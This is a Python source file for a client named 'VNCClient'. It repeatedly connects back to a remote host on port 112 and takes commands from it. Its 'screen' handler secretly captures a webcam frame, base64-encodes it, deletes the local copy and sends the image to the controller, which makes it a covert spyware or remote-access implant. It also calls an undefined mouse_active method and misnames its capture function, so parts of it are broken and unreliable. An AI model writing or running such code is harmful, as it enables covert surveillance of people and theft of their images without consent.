from PyQt5.sip import ispycreated
import pyautogui
import socket
import base64
import json
import time
import os
from lib.host import ipadd
import cv2


class VNCClient:
    def __init__(self, ip, port):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.client.connect((ip, port))
                break
            except:
                time.sleep(5)

    def screen_handler(self):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite('cam1.png', frame)
        with open('cam1.png', 'rb') as file:
            reader = base64.b64encode(file.read())
        os.remove('cam1.png')
        return reader

    def execute_handler(self):
        while True:
            responce = self.receive_json()
            if responce[0] == 'screen':
                result = self.screen_handler()
            elif 'mouse' in responce[0]:
                result = self.mouse_active(
                    responce[0], responce[1], responce[2])
            self.send_json(result)

    def send_json(self, data):
        try:
            json_data = json.dumps(data.decode('utf-8'))
        except:
            json_data = json.dumps(data)
        self.client.send(json_data.encode('utf-8'))

    def receive_json(self):
        json_data = ''
        while True:
            try:
                json_data += self.client.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                pass


myclient = VNCClient(ipadd, 112)
myclient.execute_handler()
